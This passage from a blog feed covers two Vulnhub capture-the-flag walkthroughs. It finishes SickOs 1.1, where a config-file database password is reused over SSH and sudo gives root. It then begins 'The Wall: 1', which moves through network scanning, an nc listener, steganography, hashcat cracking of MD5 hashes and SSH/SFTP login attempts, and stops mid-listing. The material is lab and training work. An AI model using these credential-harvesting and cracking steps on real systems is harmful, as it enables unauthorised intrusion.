</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;DB_PASS&#39;</span>, <span class="s1">&#39;john@123&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;TABLE_PREFIX&#39;</span>, <span class="s1">&#39;&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>// Should Wolf produce PHP error messages <span class="k">for</span> debugging?
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;DEBUG&#39;</span>, <span class="nb">false</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>www-data@SickOs:/usr/lib/cgi-bin<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>By checking the configuration file, I found DB user is <code>root</code> and password is <font color='red'><code>john@123</code></font>. I try to login SSH as user <code>root</code> with the compromised key <font color='red'><code>john@123</code></font> but failed. Then I try to SSH login as user <code>sickos</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh sickos@10.1.1.149
</span><span class='line'>sickos@10.1.1.149<span class="s1">&#39;s password: </span>
</span><span class='line'><span class="s1">Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)</span>
</span><span class='line'>
</span><span class='line'><span class="s1"> * Documentation:  https://help.ubuntu.com/</span>
</span><span class='line'>
</span><span class='line'><span class="s1">  System information as of Wed Dec 16 18:37:11 IST 2015</span>
</span><span class='line'>
</span><span class='line'><span class="s1">  System load:  0.0               Processes:           115</span>
</span><span class='line'><span class="s1">  Usage of /:   4.3% of 28.42GB   Users logged in:     0</span>
</span><span class='line'><span class="s1">  Memory usage: 12%               IP address for eth0: 10.1.1.149</span>
</span><span class='line'><span class="s1">  Swap usage:   0%</span>
</span><span class='line'>
</span><span class='line'><span class="s1">  Graph this data and manage this system at:</span>
</span><span class='line'><span class="s1">    https://landscape.canonical.com/</span>
</span><span class='line'>
</span><span class='line'><span class="s1">124 packages can be updated.</span>
</span><span class='line'><span class="s1">92 updates are security updates.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">New release &#39;</span>14.04.3 LTS<span class="s1">&#39; available.</span>
</span><span class='line'><span class="s1">Run &#39;</span><span class="k">do</span>-release-upgrade<span class="err">&#39;</span> to upgrade to it.
</span><span class='line'>
</span><span class='line'>Last login: Tue Dec <span class="m">15</span> 18:12:43 <span class="m">2015</span> from 10.1.1.130
</span><span class='line'>sickos@SickOs:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>sickos<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>sickos<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>sickos<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,111<span class="o">(</span>lpadmin<span class="o">)</span>,112<span class="o">(</span>sambashare<span class="o">)</span>
</span><span class='line'>sickos@SickOs:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Got in! Then I did enumeration over the target machine and found user <code>sickos</code> is able to use <code>sudo</code> command to run any commands as root privilege.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sickos@SickOs:~<span class="nv">$ </span>sudo -l
</span><span class='line'><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> sickos:
</span><span class='line'>Matching Defaults entries <span class="k">for</span> sickos on this host:
</span><span class='line'>    env_reset, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User sickos may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
</span><span class='line'>
</span><span class='line'>sickos@SickOs:~<span class="nv">$ </span>sudo su
</span><span class='line'>root@SickOs:/home/sickos# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>root@SickOs:/home/sickos# ls -al /root
</span><span class='line'>total 40
</span><span class='line'>drwx------  <span class="m">3</span> root root <span class="m">4096</span> Dec  <span class="m">6</span> 21:14 .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Sep <span class="m">22</span> 08:13 ..
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root   <span class="m">96</span> Dec  <span class="m">6</span> 07:27 a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>-rw-------  <span class="m">1</span> root root <span class="m">3977</span> Dec <span class="m">15</span> 19:18 .bash_history
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Apr <span class="m">19</span>  <span class="m">2012</span> .bashrc
</span><span class='line'>drwx------  <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">22</span> 08:33 .cache
</span><span class='line'>-rw-------  <span class="m">1</span> root root   <span class="m">22</span> Dec  <span class="m">5</span> 06:24 .mysql_history
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">140</span> Apr <span class="m">19</span>  <span class="m">2012</span> .profile
</span><span class='line'>-rw-------  <span class="m">1</span> root root <span class="m">5230</span> Dec  <span class="m">6</span> 21:14 .viminfo
</span><span class='line'>
</span><span class='line'>root@SickOs:/home/sickos# cat /root/a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>If you are viewing this!!
</span><span class='line'>
</span><span class='line'>ROOT!
</span><span class='line'>
</span><span class='line'>You have Succesfully completed SickOS1.1.
</span><span class='line'>Thanks <span class="k">for</span> Trying
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>root@SickOs:/home/sickos#
</span></code></pre></td></tr></table></div></figure>


<p>Done with smile :) !!</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] The Wall: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/12/08/vulnhub-the-wall-1/"/>
    <updated>2015-12-08T15:13:16+11:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/12/08/vulnhub-the-wall-1</id>
    <content type="html"><![CDATA[<p>&ldquo;In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd&rsquo;s contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.</p>

<p>You challenge is simple&hellip; set your controls for the heart of the sun, get root, and grab the flag! Rock on!&ldquo; &ndash; <a href="http://www.mogozobo.com/">Xerubus</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/the-wall-1,130/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: The Wall: 1 (<em>10.1.1.148/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>hidden information reveal</li>
<li>Image steganography exploit</li>
<li>moss code decode</li>
<li>local priv escape by sticky bit</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Sniffing local LAN for any suspicious traffic [<font color="FF8000">wireshark</font>]</li>
<li>Multiple times port scan the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Reveal hidden information from source codes and images [<font color="FF8000">steghide</font>]</li>
<li>Crack found hashes and login to SSH on target machine [<font color="FF8000">hashcat</font>]</li>
<li>Enumeration and exploit the vulnerable files which set the sticky bit to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.wireshark.org/">wireshark</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="http://steghide.sourceforge.net/">steghide</a></li>
<li><a href="http://hashcat.net/oclhashcat/">wireshark</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.148 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.148    00:0c:29:31:6b:24   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:f5:74:35   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 3.314 seconds <span class="o">(</span>77.25 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.148</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p>However, this time nothing has been found. It sounds like they are behind &lsquo;the Wall&rsquo;&hellip;:`(</p>

<p>Well, it is wierd for a machine with no ports open, so I decided to have a monitor on local LAN to see if the target machine has any suspicious network traffic.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/the_wall/1.png"></p>

<p>Here it is! Looks like the target machine is looking for tcp port <code>1337</code>, so I setup <code>nc</code> to listen on port <code>1337</code> and then got the following information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvvnp 1337
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1337</span> ...
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.148<span class="o">]</span> 43892
</span><span class='line'>
</span><span class='line'>                       .u!<span class="s2">&quot;`</span>
</span><span class='line'><span class="s2">                   .x*&quot;</span><span class="sb">`</span>
</span><span class='line'>               ..+<span class="s2">&quot;NP</span>
</span><span class='line'><span class="s2">            .z&quot;&quot;   ?</span>
</span><span class='line'><span class="s2">          M#`      9     ,     ,</span>
</span><span class='line'><span class="s2">                   9 M  d! ,8P&#39;</span>
</span><span class='line'><span class="s2">                   R X.:x&#39; R&#39;  ,</span>
</span><span class='line'><span class="s2">                   F F&#39; M  R.d&#39;</span>
</span><span class='line'><span class="s2">                   d P  @  E`  ,</span>
</span><span class='line'><span class="s2">      ss           P  &#39;  P  N.d&#39;</span>
</span><span class='line'><span class="s2">       x         &#39;&#39;        &#39;</span>
</span><span class='line'><span class="s2">       X               x             .</span>
</span><span class='line'><span class="s2">       9     .f       !         .    $b</span>
</span><span class='line'><span class="s2">       4;    $k      /         dH    $f</span>
</span><span class='line'><span class="s2">       &#39;X   ;$$     z  .       MR   :$</span>
</span><span class='line'><span class="s2">        R   M$$,   :  d9b      M&#39;   tM</span>
</span><span class='line'><span class="s2">        M:  #&#39;$L  ;&#39; M `8      X    MR</span>
</span><span class='line'><span class="s2">        `$;t&#39; $F  # X ,oR      t    Q;</span>
</span><span class='line'><span class="s2">         $$@  R$ H :RP&#39; $b     X    @&#39;</span>
</span><span class='line'><span class="s2">         9$E  @Bd&#39; $&#39;   ?X     ;    W</span>
</span><span class='line'><span class="s2">         `M&#39;  `$M d$    `E    ;.o* :R   ..</span>
</span><span class='line'><span class="s2">          `    &#39;  &quot;</span><span class="s1">&#39;     &#39;</span>    @<span class="s1">&#39;   &#39;</span><span class="nv">$o</span>*<span class="err">&quot;</span><span class="s1">&#39;   </span>
</span><span class='line'><span class="s1">   </span>
</span><span class='line'><span class="s1">              The Wall by @xerubus</span>
</span><span class='line'><span class="s1">          -= Welcome to the Machine =-</span>
</span><span class='line'>
</span><span class='line'><span class="s1">If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don&#39;</span>t be surprised when a crack in the ice appears under your feet. - Pink Floyd, The Thin Ice
</span><span class='line'> sent 0, rcvd <span class="m">1066</span> : Connection reset by peer
</span></code></pre></td></tr></table></div></figure>


<p>However, the connection has been automatically closed as soon as we receive the above information. After being stuck for a while, I decided to re-run the ports scan again. Surprisingly, this time TCP port 80 open!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.148/32 --rate<span class="o">=</span><span class="m">10000</span>
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2015-12-06 04:55:02 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.148
</span></code></pre></td></tr></table></div></figure>


<p>By checking the source code of web page, I found the interesting HEX strings at the bottom: <font color='red'><code>737465673d3333313135373330646262623337306663626539373230666536333265633035</code></font></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">&quot;#000000&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;center&gt;&lt;img</span> <span class="na">src=</span><span class="s">&quot;pink_floyd.jpg&quot;</span><span class="err">&lt;/</span><span class="na">img</span><span class="nt">&gt;&lt;/center&gt;</span>
</span><span class='line'><span class="nt">&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">&lt;!--If you want to find out what&#39;s behind these cold eyes, you&#39;ll just have to claw your way through this disguise. - Pink Floyd, The Wall  </span>
</span><span class='line'>
</span><span class='line'><span class="c">Did you know? The Publius Enigma is a mystery surrounding the Division Bell album. Publius promised an unspecified reward for solving the </span>
</span><span class='line'><span class="c">riddle, and further claimed that there was an enigma hidden within the artwork.  </span>
</span><span class='line'>
</span><span class='line'><span class="c">737465673d3333313135373330646262623337306663626539373230666536333265633035--&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>After HEX decoding, we got <code>steg=33115730dbbb370fcbe9720fe632ec05</code>, the first thing in my mind when I saw the keyword <code>steg</code> is <code>steganography</code>, some information hidden in the image file. so far, the only image file downloaded from the web page is <code>pink_floyd.jpg</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/the_wall/pink_floyd.jpg"></p>

<p>Then I firstly run <code>steghide</code> with password <font color='red'><code>33115730dbbb370fcbe9720fe632ec05</code></font> but could not extract anything&hellip; so I guess this is a MD5 hash, then I use <code>hashcat</code> with dictionary <code>rockyou</code> to crack it and found the password: <font color='red'><code>divisionbell</code></font>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncate...
</span><span class='line'>Added hashes from file stegkey.txt: <span class="m">1</span> <span class="o">(</span><span class="m">1</span> salts<span class="o">)</span>
</span><span class='line'>Activating quick-digest mode <span class="k">for</span> single-hash
</span><span class='line'>
</span><span class='line'>NOTE: press enter <span class="k">for</span> status-screen
</span><span class='line'>
</span><span class='line'>33115730dbbb370fcbe9720fe632ec05:divisionbell         &lt;-- here is the cracked password!
</span><span class='line'>
</span><span class='line'>All hashes have been recovered
</span><span class='line'>
</span><span class='line'>Input.Mode: Dict <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
</span><span class='line'>Index.....: 1/5 <span class="o">(</span>segment<span class="o">)</span>, <span class="m">3627099</span> <span class="o">(</span>words<span class="o">)</span>, <span class="m">33550339</span> <span class="o">(</span>bytes<span class="o">)</span>
</span><span class='line'>Recovered.: 1/1 hashes, 1/1 salts
</span><span class='line'>Speed/sec.: - plains, 31.00M words
</span><span class='line'>Progress..: 2063664/3627099 <span class="o">(</span>56.90%<span class="o">)</span>
</span><span class='line'>Running...: --:--:--:--
</span><span class='line'>Estimated.: --:--:--:--
</span><span class='line'>
</span><span class='line'>Started: Sun Dec  <span class="m">6</span> 00:12:55 2015
</span><span class='line'>Stopped: Sun Dec  <span class="m">6</span> 00:13:08 2015
</span></code></pre></td></tr></table></div></figure>


<p>Then use the new cracked password to extract hidden information from the image file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# steghide --extract -p divisionbell -sf pink_floyd.jpg
</span><span class='line'>wrote extracted data to <span class="s2">&quot;pink_floyd_syd.txt&quot;</span>.
</span><span class='line'>root@kali:~/the_wall# cat pink_floyd_syd.txt
</span><span class='line'>Hey Syd,
</span><span class='line'>
</span><span class='line'>I hear you<span class="err">&#39;</span>re full of dust and guitars?
</span><span class='line'>
</span><span class='line'>If you want to See Emily Play, just use this key: <span class="nv">U3lkQmFycmV0dA</span><span class="o">==</span><span class="p">|</span>f831605ae34c2399d1e5bb3a4ab245d0
</span><span class='line'>
</span><span class='line'>Roger
</span><span class='line'>
</span><span class='line'>Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
</span><span class='line'>by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
</span><span class='line'>his collection.
</span><span class='line'>
</span><span class='line'>root@kali:~/the_wall#
</span></code></pre></td></tr></table></div></figure>


<p>From the email file, we noticed that there is a key <code>U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0</code>, we can see there are two parts separated by <code>|</code>, first one is base64 encoded and the second one is a MD5 hash.</p>

<p>After cracked the string, we got the first part is <code>SydBarrett</code> and the second part is <code>pinkfloydrocks</code>. This must be a login credential, but the question is where to use it?!</p>

<p>Here I did couple of trails against to the web application but all failed (tried nikto, dirbuster and etc)&hellip; Then I guess there might be some new ports open just like what has happened on port 80, so I re-run the port scan once again.</p>

<p>Woooo, I am right! new port <code>1965</code> discovered by <code>masscan</code>!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.148/32 --rate<span class="o">=</span><span class="m">10000</span>
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2015-12-06 05:30:16 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.148
</span><span class='line'>Discovered open port 1965/tcp on 10.1.1.148
</span></code></pre></td></tr></table></div></figure>


<p>Then I run <code>nmap</code> to do a further scan for these two ports.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA5 scan initiated Sun Dec  6 00:32:59 2015 as: nmap -v -sV -O -A -p80,1965 -oN 10.1.1.148_nmap.txt 10.1.1.148</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.148
</span><span class='line'>Host is up <span class="o">(</span>0.00069s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>80/tcp   open  http    OpenBSD httpd
</span><span class='line'><span class="p">|</span>_http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 405<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-server-header: OpenBSD httpd
</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>1965/tcp open  ssh     OpenSSH 7.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 70:26:15:de:7b:29:9a:56:a3:eb:33:e0:7e:fb:92:d8 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>... truncate ...
</span></code></pre></td></tr></table></div></figure>


<p>From the scanning result, we know that <code>1965</code> is running SSH.</p>

<p>Then go SSH login on port <code>1965</code> with <code>SydBarrett</code> as username and <code>pinkfloydrocks</code> as password, but&hellip; failed&hellip; which the reasons is <code>This service allows sftp connections only</code>.. T.T</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# ssh SydBarrett@10.1.1.148 -p1965
</span><span class='line'>The authenticity of host <span class="s1">&#39;[10.1.1.148]:1965 ([10.1.1.148]:1965)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>10.1.1.148<span class="o">]</span>:1965<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">SydBarrett@10.1.1.148&#39;</span>s password:
</span><span class='line'>Could not chdir to home directory /home/SydBarrett: No such file or directory
</span><span class='line'>This service allows sftp connections only.
</span><span class='line'>Connection to 10.1.1.148 closed.
</span></code></pre></td></tr></table></div></figure>


<p>Ok, now I use sftp and try it again.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
